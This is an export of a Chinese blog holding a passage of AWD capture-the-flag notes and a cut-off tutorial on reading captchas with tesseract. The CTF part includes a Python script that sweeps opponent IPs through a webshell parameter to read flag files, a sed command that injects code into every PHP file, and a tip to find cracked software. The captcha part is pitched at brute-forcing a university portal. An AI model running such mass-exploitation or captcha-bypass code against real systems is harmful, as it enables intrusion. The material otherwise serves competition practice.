class="token operator">=</span> <span class="token function">getallheaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span> <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$method</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"SCRIPT_NAME"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"virink"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">[</span><span class="token string">'Accept'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$input</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"Get"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$get</span><span class="token punctuation">,</span> <span class="token string">"Post"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$post</span><span class="token punctuation">,</span> <span class="token string">"Cookie"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$cookie</span><span class="token punctuation">,</span> <span class="token string">"File"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$files</span><span class="token punctuation">,</span> <span class="token string">"Header"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$header</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">logging</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">logging</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$LOG_FILENAME</span> <span class="token operator">=</span> <span class="token constant">LOG_FILEDIR</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token string">".txt"</span><span class="token punctuation">;</span><span class="token variable">$LOG_FILENAME_JustParam</span> <span class="token operator">=</span> <span class="token constant">LOG_FILEDIR</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token string">"Just_param"</span><span class="token punctuation">.</span><span class="token string">".txt"</span><span class="token punctuation">;</span><span class="token shell-comment comment">#echo $LOG_FILENAME;</span><span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"Y-m-d G:i:s"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#echo </span><span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token shell-comment comment">#echo $filename;</span><span class="token shell-comment comment">#echo </span><span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$LOG_FILENAME</span><span class="token punctuation">,</span> <span class="token string">"\r\n"</span><span class="token punctuation">.</span><span class="token variable">$time</span><span class="token punctuation">.</span><span class="token string">"\r\n"</span><span class="token punctuation">.</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$LOG_FILENAME</span><span class="token punctuation">,</span><span class="token string">"\r\n"</span><span class="token punctuation">.</span>'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'], FILE_APPEND);</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$LOG_FILENAME</span><span class="token punctuation">,</span><span class="token string">"\r\n***************************************************************"</span><span class="token punctuation">,</span><span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$LOG_FILENAME_JustParam</span><span class="token punctuation">,</span> <span class="token string">"\r\n"</span><span class="token punctuation">.</span><span class="token variable">$time</span><span class="token punctuation">,</span><span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$LOG_FILENAME_JustParam</span><span class="token punctuation">,</span><span class="token string">"  "</span><span class="token punctuation">.</span>'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'], FILE_APPEND);</span><span class="token punctuation">}</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><p>然后你在其他文件加上<code>require_once(&#39;waf.php&#39;);</code>也可以拿一下命令所有php加上,源码和waf目录自己灵活一点变化</p><p><code>sudo find /var/www/html/&lt;path&gt; -type f -path &quot;*.php&quot; | xargs sed -i &quot;s/&lt;?php/&lt;?php\nrequire_once(&#39;\/tmp\/waf.php&#39;);\n/g&quot;</code></p><p>想象中是看别人的流量然后构造payload攻击其他人<br>现实情况是，压根没几个人访问过我们的网站（估计是fix太狠了</p><h5 id="6、当你能构造padload就可以批量攻击其他人了，不管别人修没修，从之前扫到的ip地址内读ip出来，打一下就完事了，处理好报错就行-比如请求的timeout设置小一点，不会那么卡"><a href="#6、当你能构造padload就可以批量攻击其他人了，不管别人修没修，从之前扫到的ip地址内读ip出来，打一下就完事了，处理好报错就行-比如请求的timeout设置小一点，不会那么卡" class="headerlink" title="6、当你能构造padload就可以批量攻击其他人了，不管别人修没修，从之前扫到的ip地址内读ip出来，打一下就完事了，处理好报错就行,比如请求的timeout设置小一点，不会那么卡"></a>6、当你能构造padload就可以批量攻击其他人了，不管别人修没修，从之前扫到的ip地址内读ip出来，打一下就完事了，处理好报错就行,比如请求的timeout设置小一点，不会那么卡</h5><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> requestsip_list<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>flag_txt<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#把文件里的ip地址转化成list</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'ip_file.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>        ip_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>list<span class="token punctuation">(</span>line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print(ip_list);</span><span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span>ip_str<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://"</span><span class="token operator">+</span>ip_str<span class="token operator">+</span><span class="token string">"/1.php?key=readfile('./flag.txt');"</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>        source <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"flag"</span> <span class="token keyword">in</span> source<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag_txt<span class="token punctuation">.</span>write<span class="token punctuation">(</span>source<span class="token punctuation">.</span>text<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">" hacked "</span><span class="token operator">+</span>source<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">" Is error "</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> KeyError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'键错误'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> IndexError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'索引错误'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> TypeError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'类型错误'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> ValueError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'值的类型错误'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>RequestException <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'超时'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'错误'</span><span class="token punctuation">)</span><span class="token keyword">for</span> ip_addr <span class="token keyword">in</span> ip_list<span class="token punctuation">:</span>    ip_str<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> ip_addr<span class="token punctuation">)</span>    get_flag<span class="token punctuation">(</span>ip_str<span class="token punctuation">)</span>flag_txt<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><code>get_flag</code>函数根据需求自己改，把flag保留在<code>flag.txt</code>的中批量提交</p><h5 id="7、批量提交flag"><a href="#7、批量提交flag" class="headerlink" title="7、批量提交flag"></a>7、批量提交flag</h5><p>当对手太多了，可以写个批量提交脚本，orz本地提交系统居然有验证码？,提交需要提供别人flag个自己token，（当然也可能需要别人的ip，按需所取吧</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsjudge_url<span class="token operator">=</span><span class="token string">"http://192.168.1.114/1.php"</span>self_token<span class="token operator">=</span><span class="token string">"Hello_kitty"</span>flag_list<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>        flag_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>list<span class="token punctuation">(</span>line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print(flag_list)        </span><span class="token keyword">def</span> <span class="token function">post_rep</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">:</span>    param <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'token'</span><span class="token punctuation">:</span> token<span class="token punctuation">,</span>        <span class="token string">'flag'</span><span class="token punctuation">:</span>flag    <span class="token punctuation">}</span>    rep <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>judge_url<span class="token punctuation">,</span> data<span class="token operator">=</span>param<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#print(rep)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"send flag success "</span><span class="token operator">+</span>flag<span class="token operator">+</span>rep<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">for</span> flag <span class="token keyword">in</span> flag_list<span class="token punctuation">:</span>    rel_flag<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">)</span>    post_rep<span class="token punctuation">(</span>rel_flag<span class="token punctuation">,</span>self_token<span class="token punctuation">)</span></code></pre><h5 id="8、文件对比"><a href="#8、文件对比" class="headerlink" title="8、文件对比"></a>8、文件对比</h5><p>当你发现自己文件被动了手教可以使用软件对比哪里变化了，推荐软件<code>BeyondCompare</code>网上可以找找破解版</p><h3 id="题目就不点评了，只能说自己php和运维能力是真滴虚，暑假努力了"><a href="#题目就不点评了，只能说自己php和运维能力是真滴虚，暑假努力了" class="headerlink" title="题目就不点评了，只能说自己php和运维能力是真滴虚，暑假努力了"></a>题目就不点评了，只能说自己php和运维能力是真滴虚，暑假努力了</h3><p>运维小知识</p><h4 id="php停止和重启（查杀不死马"><a href="#php停止和重启（查杀不死马" class="headerlink" title="php停止和重启（查杀不死马"></a>php停止和重启（查杀不死马</h4><pre><code>service php-fpm start  开启service php-fpm stop   停止service php-fpm restart  重启</code></pre><h4 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h4><p>启动</p><pre><code>启动代码格式：nginx安装目录地址 -c nginx配置文件地址[root@LinuxServer sbin]# /usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf</code></pre><p>nginx的停止有三种方式：<br>1、查看进程号<br>2、然后杀死</p><pre><code>[root@LinuxServer ~]# ps -ef|grep nginx[root@LinuxServer ~]# kill -QUIT 2072</code></pre><p>强制停止</p><pre><code>[root@LinuxServer ~]# pkill -9 nginx</code></pre><p>重启<br>进入nginx安装目录sbin下，输入命令./nginx -t<br>看到如下显示nginx.conf syntax is ok<br>nginx.conf test is successful</p><pre><code>进入nginx可执行目录sbin下，输入命令**./nginx -s reload** 即可或者查找当前nginx进程号，然后输入命令：kill -HUP 进程号 实现重启nginx服务</code></pre><h4 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h4><p>基本的操作方法：</p><pre><code>假设你的apahce安装目录为/usr/local/apache2，这些方法适合任何情况apahce启动命令：推荐/usr/local/apache2/bin/apachectl start apaceh启动apache停止命令/usr/local/apache2/bin/apachectl stop 停止apache重新启动命令：/usr/local/apache2/bin/apachectl restart 重启要在重启 Apache 服务器时不中断当前的连接，则应运行：/usr/local/sbin/apachectl graceful如果apache安装成为linux的服务的话，可以用以下命令操作：service httpd start 启动service httpd restart 重新启动service httpd stop 停止服务</code></pre><h4 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h4><ol start="2"><li>备份<pre><code>[root@localhost ~]# cd /var/lib/mysql (进入到MySQL库目录，根据自己的MySQL的安装情况调整目录)[root@localhost mysql]# mysqldump -u root -p Test&gt;Test0809.sql，输入密码即可。</code></pre></li><li>还原<br>法一：<pre><code>[root@localhost ~]# mysql -u root -p 回车，输入密码，进入MySQL的控制台&quot;mysql&gt;&quot;，输入命令&quot;show databases；&quot;。</code></pre></li></ol><p>看看有些什么数据库；</p><pre><code>建立你要还原的数据库，输入&quot;create database voice；&quot;，切换到刚建立的数据库，输入&quot;use voice；&quot;，回车；导入数据，输入&quot;source voice.sql；&quot;，回车，开始导入，再次出现&quot;mysql&gt;&quot;并且没有提示错误即还原成功。[root@localhost ~]# cd /var/lib/mysql (进入到MySQL库目录，根据自己的MySQL的安装情况调整目录)[root@localhost mysql]# mysql -u root -p Test&lt;Test0809.sql，输入密码即可（将要恢复的数据库文件放到服务器的某个目录下，并进入这个目录执行以上命令|）。moodle_bak.sql是需要恢复的文件名</code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用tesseract和Pillow简单识别验证码</title>
      <link href="/2019/06/14/shi-yong-tesseract-he-pillow-jian-dan-shi-bie-yan-zheng-ma/"/>
      <url>/2019/06/14/shi-yong-tesseract-he-pillow-jian-dan-shi-bie-yan-zheng-ma/</url>
      
        <content type="html"><![CDATA[<h2 id="楔子"><a href="#楔子" class="headerlink" title="楔子"></a>楔子</h2><p>之前的爬虫总是被验证码卡住，无论是爬某数据，还是爆破某东西，有了验证码貌似就GG,发现了一个不错的库很简答的识别简单的验证码，就是安装不能直接pip安装</p><h3 id="一、win10安装tesseract"><a href="#一、win10安装tesseract" class="headerlink" title="一、win10安装tesseract"></a>一、win10安装tesseract</h3><p><a href="https://github.com/tesseract-ocr/tesseract/wiki/Downloads" target="_blank" rel="noopener">Github地址</a>,找了半天没找到在哪下win10安装包，orz<br><a href="https://digi.bib.uni-mannheim.de/tesseract/" target="_blank" rel="noopener">备用一个下载地址</a>，下载一个就行比如tesseract-ocr-setup-3.05.01.exe，然后安装<br>之后需要配置环境变量（和jdk，python一样），具体就是<code>\tesseract\Tesseract-OCR</code>,在终端输入tesseract为↓</p><a id="more"></a><p><img src="1.png" alt=""></p><h3 id="二、安装python相关的包"><a href="#二、安装python相关的包" class="headerlink" title="二、安装python相关的包"></a>二、安装python相关的包</h3><pre><code>pip install pytesseractpip install pillow</code></pre><p>有个很恶心的地方，感觉之前的crypto包也有类似的问题<br>在<code>\python3\Lib\site-packages\pytesseract</code>中的<code>pytesseract.py</code>第三十五行</p><pre><code>tesseract_cmd = &#39;{你自己tesseract安装的目录}&#39;比如我的↓tesseract_cmd = &#39;C:/tesseract/Tesseract-OCR/tesseract&#39;</code></pre><p><img src="2.png" alt=""></p><h3 id="三、简单介绍一下验证码种类"><a href="#三、简单介绍一下验证码种类" class="headerlink" title="三、简单介绍一下验证码种类"></a>三、简单介绍一下验证码种类</h3><p>1）图形验证码<br>图形验证码应该是最简单的一种验证码，这种验证码是最早出现，也是目前最常见的，一般组成规则是4个字母或数字或混合组成;比如某校的某站<br><img src="4.png" alt=""><br>2）滑动验证码<br>就是滑动拼图吧，比如哔哩哔哩<br>3）点触验证码<br>国外网站居多</p><h3 id="三、最简单的车"><a href="#三、最简单的车" class="headerlink" title="三、最简单的车"></a>三、最简单的车</h3><p>这是最简单的一类验证码<br><img src="2.jpg" alt=""><br>有了之前的的安装，这样的验证码就很简单<br><img src="3.png" alt=""></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: UTF-8 -*_</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">from</span> pytesseract <span class="token keyword">import</span> <span class="token operator">*</span>im <span class="token operator">=</span> Image<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">'1.jpg'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>pytesseract<span class="token punctuation">.</span>image_to_string<span class="token punctuation">(</span>im<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="四、优化程序，排除干扰"><a href="#四、优化程序，排除干扰" class="headerlink" title="四、优化程序，排除干扰"></a>四、优化程序，排除干扰</h3><p>很多地方的验证码是有干扰的比如中间多一根横线，比如某教务处<br><img src="3.jpg" alt=""><br>首先可以灰度和二值化处理</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!usr/bin/env python</span><span class="token comment" spellcheck="true"># coding:utf-8</span><span class="token keyword">from</span> pytesseract <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imageimage <span class="token operator">=</span> Image<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">"4.jpg"</span><span class="token punctuation">)</span>image <span class="token operator">=</span> image<span class="token punctuation">.</span>convert<span class="token punctuation">(</span><span class="token string">'L'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#转化为灰度图</span>threshold <span class="token operator">=</span> <span class="token number">127</span>             <span class="token comment" spellcheck="true">#设定的二值化阈值</span>table <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                  <span class="token comment" spellcheck="true">#table是设定的一个表，下面的for循环可以理解为一个规则，小于阈值的，就设定为0，大于阈值的，就设定为1</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">&lt;</span> threshold<span class="token punctuation">:</span>        table<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        table<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>image <span class="token operator">=</span> image<span class="token punctuation">.</span>point<span class="token punctuation">(</span>table<span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#对灰度图进行二值化处理，按照table的规则（也就是上面的for循环）</span>result <span class="token operator">=</span> pytesseract<span class="token punctuation">.</span>image_to_string<span class="token punctuation">(</span>image<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#对去噪后的图片进行识别</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><p>很可惜上面脚本上不了教务处<br>下面的正在魔改中。。。ing </p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> pytesseract<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">from</span> collections <span class="token keyword">import</span> defaultdict<span class="token comment" spellcheck="true"># tesseract.exe所在的文件路径</span><span class="token comment" spellcheck="true"># 获取图片中像素点数量最多的像素</span><span class="token keyword">def</span> <span class="token function">get_threshold</span><span class="token punctuation">(</span>image<span class="token punctuation">)</span><span class="token punctuation">:</span>    pixel_dict <span class="token operator">=</span> defaultdict<span class="token punctuation">(</span>int<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 像素及该像素出现次数的字典</span>    rows<span class="token punctuation">,</span> cols <span class="token operator">=</span> image<span class="token punctuation">.</span>size    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>rows<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>cols<span class="token punctuation">)</span><span class="token punctuation">:</span>            pixel <span class="token operator">=</span> image<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span>            pixel_dict<span class="token punctuation">[</span>pixel<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>    count_max <span class="token operator">=</span> max<span class="token punctuation">(</span>pixel_dict<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 获取像素出现出多的次数</span>    pixel_dict_reverse <span class="token operator">=</span> <span class="token punctuation">{</span>v<span class="token punctuation">:</span>k <span class="token keyword">for</span> k<span class="token punctuation">,</span>v <span class="token keyword">in</span> pixel_dict<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>    threshold <span class="token operator">=</span> pixel_dict_reverse<span class="token punctuation">[</span>count_max<span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># 获取出现次数最多的像素点</span>    <span class="token keyword">return</span> threshold<span class="token comment" spellcheck="true"># 按照阈值进行二值化处理</span><span class="token comment" spellcheck="true"># threshold: 像素阈值</span><span class="token keyword">def</span> <span class="token function">get_bin_table</span><span class="token punctuation">(</span>threshold<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 获取灰度转二值的映射table</span>    table <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        rate <span class="token operator">=</span> <span class="token number">0.1</span> <span class="token comment" spellcheck="true"># 在threshold的适当范围内进行处理</span>        <span class="token keyword">if</span> threshold<span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">-</span>rate<span class="token punctuation">)</span><span class="token operator">&lt;=</span> i <span class="token operator">&lt;=</span> threshold<span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span>rate<span class="token punctuation">)</span><span class="token punctuation">:</span>            table<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            table<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> table<span class="token comment" spellcheck="true"># 去掉二值化处理后的图片中的噪声点</span><span class="token keyword">def</span> <span class="token function">cut_noise</span><span class="token punctuation">(</span>image<span class="token punctuation">)</span><span class="token punctuation">:</span>    rows<span class="token punctuation">,</span> cols <span class="token operator">=</span> image<span class="token punctuation">.</span>size <span class="token comment" spellcheck="true"># 图片的宽度和高度</span>    change_pos <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># 记录噪声点位置</span>    <span class="token comment" spellcheck="true"># 遍历图片中的每个点，除掉边缘</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> rows<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> cols<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># pixel_set用来记录该店附近的黑色像素的数量</span>            pixel_set <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>            <span class="token comment" spellcheck="true"># 取该点的邻域为以该点为中心的九宫格</span>            <span class="token keyword">for</span> m <span class="token keyword">in</span> range<span class="token punctuation">(</span>i<span class="token number">-1</span><span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> n <span class="token keyword">in</span> range<span class="token punctuation">(</span>j<span class="token number">-1</span><span class="token punctuation">,</span> j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> image<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 1为白色,0位黑色</span>                        pixel_set<span class="token punctuation">.</span>append<span class="token punctuation">(</span>image<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 如果该位置的九宫内的黑色数量小于等于4，则判断为噪声</span>            <span class="token 